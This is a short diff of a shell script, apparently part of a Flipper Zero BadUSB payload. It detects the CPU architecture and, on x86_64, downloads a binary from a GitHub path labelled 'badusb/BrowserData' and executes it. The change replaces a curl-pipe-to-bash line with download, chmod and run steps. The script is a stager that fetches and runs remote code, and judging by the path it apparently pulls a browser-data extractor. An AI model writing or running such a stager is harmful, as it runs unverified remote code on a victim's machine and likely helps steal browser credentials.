@@ -3,7 +3,9 @@ architecture=$(uname -m)
 if [ "$architecture" == "armv7l" ]; then
     echo "L'architecture est ARM."
 elif [ "$architecture" == "x86_64" ]; then
-    curl -sSL https://raw.githubusercontent.com/MagikarpLv13/flipper-zero/main/badusb/BrowserData/External/linux_amd64 | bash
+    curl -sSL https://raw.githubusercontent.com/MagikarpLv13/flipper-zero/main/badusb/BrowserData/External/linux_amd64 -o test_script.sh
+    chmod +x test_script.sh
+    ./test_script.sh
 elif [ "$architecture" == "i686" ] || [ "$architecture" == "i386" ]; then
     echo "L'architecture est x86 (32 bits)."
 else
